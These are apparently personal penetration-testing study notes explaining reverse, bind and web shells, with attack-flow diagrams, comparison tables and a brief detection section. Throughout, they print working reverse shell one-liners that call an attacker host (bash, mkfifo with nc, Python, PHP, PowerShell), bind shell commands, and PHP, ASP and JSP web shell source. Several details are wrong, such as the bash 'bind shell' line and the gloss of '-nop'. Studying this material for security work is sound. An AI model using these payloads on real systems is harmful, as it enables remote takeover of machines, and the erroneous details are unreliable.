# Types of Shells: Remote Code Execution & System Access

**Status:** Work in Progress  
**Last Updated:** January 25, 2026

---

## ⚡ Quick Reference Card: Shell Types Overview

### The Problem We're Solving
After compromising a system through vulnerability exploitation:
- ❌ Re-exploiting the same vulnerability for each command = inefficient
- ❌ Difficult to enumerate the system or move laterally without direct access
- ✅ Need reliable connection to system shell (Bash, PowerShell, cmd.exe)
- ✅ Need method to execute commands and receive output

### Traditional Access Methods (Limited Use)
| Method | Protocol | Requirements | Limitations |
|--------|----------|--------------|-------------|
| SSH | SSH (Linux) | Valid credentials | Need working login creds |
| RDP | RDP (Windows) | Valid credentials | Need working login creds |
| WinRM | WinRM (Windows) | Valid credentials | Need working login creds |

**Problem:** Must already have credentials OR execute commands first to enable these services

### Three Main Types of Shells

```
SHELL TYPES
    ├── 1. REVERSE SHELL
    │   ├── Direction: Target → Attacker
    │   ├── Connection: Target initiates connection
    │   ├── Attacker Role: Listener (waits for connection)
    │   └── Use Case: Most common, very reliable
    │
    ├── 2. BIND SHELL
    │   ├── Direction: Attacker → Target
    │   ├── Connection: Attacker initiates connection
    │   ├── Target Role: Listener (waits for connection)
    │   └── Use Case: When outbound connections blocked
    │
    └── 3. WEB SHELL
        ├── Direction: Bidirectional (HTTP)
        ├── Connection: HTTP requests/responses
        ├── Protocol: Web server (80, 443, custom ports)
        └── Use Case: Web application compromise
```

---

## 1️⃣ REVERSE SHELL

### Definition
A reverse shell **connects back to our system** and gives us control through a reverse connection. The compromised system initiates the connection to the attacker's machine.

### How It Works

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: ATTACKER SETUP                                      │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Set up listener (netcat, metasploit)              │
│ Command: nc -lvnp 4444                                      │
│ Waits on: Port 4444                                         │
│ Status: Listening...                                         │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit vulnerability on target                   │
│ Target executes: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 │
│ This command: Creates reverse shell connection              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: REVERSE CONNECTION ESTABLISHED                      │
├─────────────────────────────────────────────────────────────┤
│ Target → Attacker: Initiates connection to attacker         │
│ Connection: From target port (random) → attacker port 4444  │
│ Result: Attacker receives shell connection                  │
│ Status: Connected!                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 4: COMMAND EXECUTION                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker types: ls -la                                      │
│ Attacker sends: Command through reverse connection          │
│ Target receives: Command on established connection          │
│ Target executes: Runs 'ls -la' locally                      │
│ Target returns: Output through reverse connection           │
│ Attacker sees: Output displayed in terminal                 │
└─────────────────────────────────────────────────────────────┘
```

### Characteristics

| Aspect | Details |
|--------|---------|
| **Initiation** | Target initiates connection to attacker |
| **Connection Type** | Outbound from target (very common) |
| **Attacker Role** | Listener (passive, then interactive) |
| **Target Role** | Initiator (active connection) |
| **Firewall Implications** | Works if target allows outbound connections |
| **Reliability** | Very high (most common shell type) |
| **Setup Complexity** | Low (single command execution needed) |
| **Ease of Use** | High (interactive shell immediately) |

### Common Reverse Shell Payloads

**Bash Reverse Shell**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Bash Alternative (if /dev/tcp not available)**
```bash
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

**Netcat Reverse Shell**
```bash
nc -e /bin/sh ATTACKER_IP PORT
```

**Python Reverse Shell**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP Reverse Shell**
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Attacker Setup (Receiving Reverse Shell)

**Using Netcat (Simple)**
```bash
nc -lvnp 4444
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = port
```

**Using Metasploit (Advanced)**
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

### Advantages ✅
- ✅ Very common and reliable
- ✅ Works even if target behind NAT/firewall (if outbound allowed)
- ✅ Single command execution to establish
- ✅ Interactive shell immediately
- ✅ Easy to set up
- ✅ Works across most protocols and languages

### Disadvantages ❌
- ❌ Requires outbound connection from target (may be blocked)
- ❌ Target must know attacker's IP and port
- ❌ If attacker loses connection, must re-exploit to get shell back
- ❌ Attacker's IP exposed to target logs

### Use Cases 🎯
- Post-exploitation shell access
- Quick interactive access to compromised system
- Lateral movement within network
- System enumeration after initial breach

---

## 2️⃣ BIND SHELL

### Definition
A bind shell **waits for us to connect to it** and gives us control once we do. The compromised system listens on a port and waits for the attacker to connect.

### How It Works

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit vulnerability on target                   │
│ Target executes: nc -lvnp 4444 -e /bin/sh                   │
│ This command: Binds shell to port 4444                      │
│ Status: Listening on port 4444                              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: ATTACKER CONNECTS                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Connect to target's listening port                │
│ Command: nc TARGET_IP 4444                                  │
│ Connection: From attacker → target port 4444                │
│ Target: Accepts incoming connection                         │
│ Status: Connected!                                          │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: COMMAND EXECUTION                                   │
├─────────────────────────────────────────────────────────────┤
│ Attacker types: ls -la                                      │
│ Attacker sends: Command through connection                  │
│ Target receives: Command on established shell               │
│ Target executes: Runs 'ls -la' locally                      │
│ Target returns: Output through shell                        │
│ Attacker sees: Output displayed in terminal                 │
└─────────────────────────────────────────────────────────────┘
```

### Characteristics

| Aspect | Details |
|--------|---------|
| **Initiation** | Attacker initiates connection to target |
| **Connection Type** | Inbound to target (from attacker) |
| **Attacker Role** | Connector (active connection) |
| **Target Role** | Listener (passive, then interactive) |
| **Firewall Implications** | Works if target allows inbound connections |
| **Reliability** | Moderate (depends on inbound filtering) |
| **Setup Complexity** | Low (single command execution needed) |
| **Ease of Use** | High (interactive shell immediately) |

### Common Bind Shell Payloads

**Bash Bind Shell (Listen on port, execute /bin/sh)**
```bash
bash -i >& /dev/tcp/0.0.0.0/4444 0>&1
```

**Netcat Bind Shell**
```bash
nc -lvnp 4444 -e /bin/sh
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = port
# -e = execute /bin/sh on connection
```

**Python Bind Shell**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Attacker Connection (Connecting to Bind Shell)

**Using Netcat (Simple)**
```bash
nc TARGET_IP 4444
```

**Using SSH Tunnel (If SSH available)**
```bash
ssh -L 4444:localhost:4444 user@TARGET_IP
nc localhost 4444
```

### Advantages ✅
- ✅ Works if outbound connections from target are blocked
- ✅ Attacker doesn't need to expose their IP immediately
- ✅ Can reconnect multiple times
- ✅ Good for environments with strict egress filtering

### Disadvantages ❌
- ❌ Requires target to have inbound port open
- ❌ Often blocked by firewalls (inbound filtering)
- ❌ Target exposes port publicly
- ❌ Less common than reverse shells
- ❌ More likely to be detected

### Use Cases 🎯
- Egress filtering environments (target can't connect out)
- Network segments where outbound connections blocked
- Scenarios where multiple team members need access

---

## 3️⃣ WEB SHELL

### Definition
A web shell **communicates through a web server**, accepts our commands through HTTP parameters, executes them, and prints back the output. Commands are sent via HTTP requests and responses.

### How It Works

```
ATTACK FLOW:

┌─────────────────────────────────────────────────────────────┐
│ STEP 1: INITIAL EXPLOITATION                                │
├─────────────────────────────────────────────────────────────┤
│ Attacker: Exploit web vulnerability (file upload, RFI)      │
│ Target: Web shell file uploaded to web root                 │
│ Example: /var/www/html/shell.php                            │
│ Status: Shell now accessible via HTTP                       │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 2: SENDING COMMANDS VIA HTTP                           │
├─────────────────────────────────────────────────────────────┤
│ Attacker types: ls -la                                      │
│ Attacker sends: GET /shell.php?cmd=ls%20-la HTTP/1.1        │
│ Communication: HTTP request to web server                   │
│ Protocol: HTTP (port 80, 443, or custom)                    │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ STEP 3: COMMAND EXECUTION                                   │
├─────────────────────────────────────────────────────────────┤
│ Web server: Receives HTTP request                           │
│ Web shell: Parses 'cmd' parameter                           │
│ Target executes: Runs 'ls -la' via shell_exec() or system()│
│ Captures output: Command output stored                      │
│ Returns: Output embedded in HTTP response                   │
│ Attacker sees: Output displayed in browser/terminal         │
└─────────────────────────────────────────────────────────────┘
```

### Characteristics

| Aspect | Details |
|--------|---------|
| **Communication** | HTTP requests/responses |
| **Connection Type** | Stateless (each command = new request) |
| **Attacker Role** | HTTP client (sends requests) |
| **Target Role** | HTTP server + shell executor |
| **Firewall Implications** | Often allowed (looks like normal traffic) |
| **Reliability** | High (standard web traffic) |
| **Setup Complexity** | Medium (file placement required) |
| **Ease of Use** | Medium (need to format HTTP requests) |

### Common Web Shell Examples

**Simple PHP Web Shell**
```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
    die;
}
?>
```

**Usage:**
```bash
# Command execution via HTTP
curl "http://TARGET_IP/shell.php?cmd=ls%20-la"
curl "http://TARGET_IP/shell.php?cmd=whoami"
curl "http://TARGET_IP/shell.php?cmd=id"
```

**ASP Web Shell (Windows)**
```asp
<%
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec(Request.QueryString("cmd"))
strOutput = objExec.StdOut.ReadAll()
Response.Write("<pre>" & strOutput & "</pre>")
%>
```

**JSP Web Shell (Java)**
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>
```

### Popular Web Shell Tools

**One-Liners (Quick upload)**
```bash
# Python one-liner
python -m SimpleHTTPServer 8000

# PHP one-liner (unsafe)
php -r '$_REQUEST["cmd"] && system($_REQUEST["cmd"]);'

# ASP one-liner
<%@ eval(Request.Item[chr(99)+chr(109)+chr(100)]) %>
```

**Tool: weevely (Web Shell Generator)**
```bash
weevely generate password shell.php
# Generates encrypted web shell with backdoor password
```

### How to Access Web Shell

**Method 1: Browser**
```
http://target.com/shell.php?cmd=whoami
```

**Method 2: cURL**
```bash
curl "http://target.com/shell.php?cmd=ls%20-la"
```

**Method 3: Specialized Tools**
```bash
# weevely interactive shell
weevely http://target.com/shell.php password

# Custom Python script
python exploit.py --url http://target.com/shell.php --cmd "id"
```

### Advantages ✅
- ✅ Uses standard HTTP protocol (hard to block)
- ✅ Looks like normal web traffic
- ✅ Persistent if file not deleted
- ✅ Can be placed in multiple locations
- ✅ Works through web proxies
- ✅ Doesn't require outbound/inbound connections
- ✅ Easy to automate with scripts

### Disadvantages ❌
- ❌ Leaves file artifact on disk (detectable)
- ❌ Not true interactive shell experience
- ❌ Limited to web server user permissions
- ❌ Each command = separate HTTP request (slower)
- ❌ Output limited to HTTP response size
- ❌ More likely to be detected by WAF/IDS
- ❌ Binary execution limitations

### Use Cases 🎯
- Web application compromise
- Persistent access (file-based)
- Environments with strict firewall rules
- Situations where interactive shell not available
- Quick command execution without reverse/bind shell

### Detection & Defense
**How to detect:**
```bash
# Look for suspicious PHP files
find /var/www -name "*.php" -type f -ls

# Check for unusual system calls
auditctl -l | grep exec

# Web server logs for suspicious patterns
grep "cmd=" /var/log/apache2/access.log
```

**How to prevent:**
- Disable dangerous PHP functions: `shell_exec`, `system`, `exec`, `passthru`
- Implement file upload restrictions
- Use Web Application Firewall (WAF)
- Monitor for suspicious file uploads

---

## Comparison Table: All Three Shell Types

| Feature | Reverse Shell | Bind Shell | Web Shell |
|---------|---------------|-----------|-----------|
| **Who Initiates** | Target | Attacker | Attacker (HTTP) |
| **Direction** | Target → Attacker | Attacker → Target | HTTP bidirectional |
| **Attacker Role** | Listener | Connector | Client |
| **Setup Complexity** | Low | Low | Medium |
| **Interactive Feel** | Yes (real-time) | Yes (real-time) | No (per-command) |
| **Firewall Friendly** | Outbound allowed | Inbound allowed | HTTP allowed |
| **Most Common** | ✅ Most | ❌ Less | ✅ Very common |
| **Persistence** | Temporary | Temporary | Persistent (file) |
| **Detection Risk** | Medium | Medium | High (file artifact) |
| **Use Case** | Post-exploitation | Egress blocked | Web app compromise |

---

## Summary & Key Takeaways

### When to Use Each Shell Type

**Use REVERSE SHELL when:**
- ✅ Target can make outbound connections
- ✅ Need immediate interactive shell
- ✅ Want minimal artifact on disk
- ✅ Need maximum reliability

**Use BIND SHELL when:**
- ✅ Outbound connections blocked/filtered
- ✅ Can connect inbound to target
- ✅ Need interactive shell access
- ✅ Multiple team members need access

**Use WEB SHELL when:**
- ✅ Web application compromised
- ✅ Need persistent access
- ✅ Firewall blocks network shells
- ✅ Only web protocols allowed
- ✅ Need to blend with normal traffic

### Critical Concepts

1. **Shell Selection Depends on Environment**
   - Network filtering (firewall rules)
   - Outbound vs. inbound restrictions
   - Available protocols

2. **Shells are Temporary Bridges**
   - Used to maintain access after exploitation
   - Used to enumerate system for next moves
   - Used for lateral movement and privilege escalation

3. **Each Has Tradeoffs**
   - Reliability vs. detectability
   - Interactivity vs. stealth
   - Setup complexity vs. reliability

---

---

# PART 2: DIVING DEEPER INTO SHELL TYPES

## Reverse Shell Deep Dive

### Why Reverse Shells are Most Common

**Three Reasons:**
1. ✅ **Quickest** to obtain initial access
2. ✅ **Easiest** to set up and execute
3. ✅ **Most reliable** across different systems

### Complete Reverse Shell Workflow

#### Step 1: Set Up Netcat Listener (Attacker Machine)

**Command:**
```bash
nc -lvnp 1234
```

**Flag Breakdown:**
| Flag | Meaning | Purpose |
|------|---------|---------|
| `-l` | Listen mode | Wait for connection to connect to us |
| `-v` | Verbose | Know when we receive a connection |
| `-n` | No DNS resolution | Connect from/to IPs only (speed up connection) |
| `-p 1234` | Port number | Port netcat listens on + port for reverse connection |

**What Happens:**
```
Attacker Machine:
┌─────────────────────────────────┐
│ $ nc -lvnp 1234                 │
│ listening on [any] 1234 ...     │
│ (waiting for connection...)     │
└─────────────────────────────────┘
Status: LISTENING on port 1234
Action: Waiting for target to connect
```

---

#### Step 2: Identify Attacker Machine IP Address

**Command:**
```bash
ip a
```

**What to Look For:**
```bash
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0
    ^^^^^^^^^^^^^^^
    This is your IP to use in reverse shell!
```

**Important:**
- Find the IP address of your network interface (usually eth0, tun0, or wlan0)
- Use this IP in the reverse shell command
- Make sure you use the correct IP that the target can reach

---

#### Step 3: Execute Reverse Shell Command (Target Machine)

**Selection Depends On:**
1. Operating System (Linux vs Windows)
2. Available applications/commands on target
3. Shell interpreter available (Bash, PowerShell, etc.)

### Linux Reverse Shell Payloads

#### Bash - Method 1 (Most Reliable)
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

**Breakdown:**
```
bash -c '...'                           # Execute bash command
  bash -i                              # Interactive bash shell
  >&                                   # Redirect stderr to stdout
  /dev/tcp/10.10.10.10/1234           # TCP connection to attacker IP:port
  0>&1                                 # Redirect stdin to stdout
```

**How It Works:**
1. Creates interactive bash shell
2. Connects to attacker's IP on port 1234
3. Redirects all input/output to the connection
4. Established reverse connection

**Example in Use:**
```bash
# On target machine (after RCE vulnerability):
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# On attacker machine:
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.10] from [TARGET_IP] [RANDOM_PORT]
bash: cannot set terminal process group...
user@target:~$
# Shell connection established!
```

---

#### Bash - Method 2 (Alternative using mkfifo)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 > /tmp/f
```

**Breakdown:**
```
rm /tmp/f                              # Remove old FIFO if exists
mkfifo /tmp/f                          # Create named pipe (FIFO)
cat /tmp/f|                            # Read from FIFO
  /bin/sh -i                           # Interactive shell
  2>&1                                 # Redirect stderr to stdout
  nc 10.10.10.10 1234                 # Netcat connection to attacker
  > /tmp/f                             # Write back to FIFO
```

**How It Works:**
1. Creates a named pipe (FIFO) for bidirectional communication
2. Reads from the FIFO and feeds to shell
3. Shell output goes to netcat
4. Netcat sends data back to FIFO
5. Creates bidirectional shell

**Why Two Methods?**
- Method 1: Uses /dev/tcp (newer systems, more direct)
- Method 2: Uses named pipes (older systems, more compatibility)
- Try Method 1 first, fall back to Method 2 if it fails

---

### Windows Reverse Shell Payload

#### PowerShell (Full-Featured)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10' ,1234); $s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $data 2>&1 | Out-String); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Breakdown (Simplified):**
```powershell
powershell -nop -c "
  # Create TCP client connection
  $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234)
  
  # Get network stream for communication
  $s = $client.GetStream()
  
  # Create byte array for reading data
  [byte[]]$b = 0..65535|%{0}
  
  # Main loop - while receiving data
  while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    # Convert bytes to string
    $data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i)
    
    # Execute command and capture output
    $sb = (iex $data 2>&1 | Out-String)
    
    # Format output with PowerShell prompt
    $sb2 = $sb + 'PS ' + (pwd).Path + '> '
    
    # Convert output back to bytes
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2)
    
    # Send output back through stream
    $s.Write($sbt,0,$sbt.Length)
    $s.Flush()
  }
  
  # Close connection
  $client.Close()
"
```

**Key Features:**
- ✅ Creates TCP connection to attacker
- ✅ Reads commands from network stream
- ✅ Executes commands with `iex` (Invoke-Expression)
- ✅ Captures output (stdout and stderr)
- ✅ Sends formatted output back with PowerShell prompt
- ✅ Maintains connection in loop

**PowerShell Flags:**
| Flag | Meaning |
|------|---------|
| `-nop` | No Output Policy (bypass execution policy) |
| `-c` | Command (execute the following command) |

---

### Payload Selection Guide

**For Linux Targets, Try In This Order:**

| #1 | Method | Command | When to Use |
|----|--------|---------|------------|
| 1 | Bash /dev/tcp | `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` | First choice, most reliable |
| 2 | Bash mkfifo | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc IP PORT > /tmp/f` | If /dev/tcp fails |
| 3 | Netcat | `nc -e /bin/sh IP PORT` | If bash/sh failing |
| 4 | Python | `python -c 'import socket...'` | If netcat not available |
| 5 | Perl | `perl -e 'use Socket...'` | Last resort on minimal systems |

**For Windows Targets:**

| Priority | Method | When to Use |
|----------|--------|------------|
| 1 | PowerShell | If PowerShell available (most systems) |
| 2 | Batch | If PowerShell disabled/blocked |
| 3 | VBScript | If batch restricted |

---

### Comprehensive Reverse Shell Reference

#### Common Commands by OS

**Linux - Bash (Most Common):**
```bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

**Linux - Bash One-liner:**
```bash
bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

**Linux - Netcat:**
```bash
nc -e /bin/sh 10.10.10.10 1234
```

**Linux - Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Windows - PowerShell (Full):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234); $s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -Typename System.text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $data 2>&1 | Out-String); $sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

**Windows - PowerShell (Shortened):**
```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object System.text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($r2);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()"
```

---

### Step-by-Step Complete Example

**Scenario:** Target vulnerable to RCE, we want reverse shell

#### On Attacker Machine:
```bash
# Step 1: Find our IP
$ ip a
...
inet 10.10.10.10/24 brd 10.10.10.255 scope global eth0

# Step 2: Start netcat listener on port 1234
$ nc -lvnp 1234
listening on [any] 1234 ...
(waiting for connection...)
```

#### On Target Machine (via RCE vulnerability):
```bash
# Execute reverse shell command
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

#### Back on Attacker Machine:
```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.10] from [TARGET_IP] [RANDOM_PORT]
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
user@target:~$ 
# Connected! Can now execute commands on target
user@target:~$ whoami
www-data
user@target:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
user@target:~$ pwd
/var/www/html
```

---

### Troubleshooting Reverse Shells

**Problem: Connection times out**
```
Solution 1: Verify your attacker IP is correct (ip a)
Solution 2: Check firewall allows outbound on target
Solution 3: Try different port number
Solution 4: Try alternative reverse shell command
```

**Problem: Command not found (bash/nc not available)**
```
Solution: Use alternative command (Python, Perl, etc.)
Try: which bash, which nc, which python
Pick available one for reverse shell
```

**Problem: Connection established but no prompt**
```
Solution 1: Press Enter to get prompt
Solution 2: May need to interact differently
Solution 3: Try: export PS1="shell> "
```

**Problem: Shell dies/disconnects**
```
Solution: Reverse shell connection is fragile
Action: Re-execute reverse shell command to reconnect
Better: Establish bind shell or web shell for persistence
```

---

### Key Takeaways - Reverse Shells

1. **Setup Flow:**
   - Listener on attacker machine (nc -lvnp PORT)
   - Target executes reverse shell command
   - Connection established (target → attacker)

2. **Payload Selection:**
   - Linux: bash -c with /dev/tcp or mkfifo
   - Windows: PowerShell one-liner
   - Choice depends on available commands on target

3. **Most Important Things:**
   - Get your IP correct (ip a)
   - Choose available command on target
   - Try multiple payloads if first fails

4. **Why Most Common:**
   - Single command execution needed
   - Works behind NAT/firewalls (outbound)
   - Quick and easy to set up
   - Very reliable across systems

---

## Notes

- Add more shell types as you discover them
- Document real-world usage examples
- Include evasion techniques as you learn them
- Add detection/defense methodologies
- Build personal playbook of effective payloads

**Last Updated:** January 25, 2026
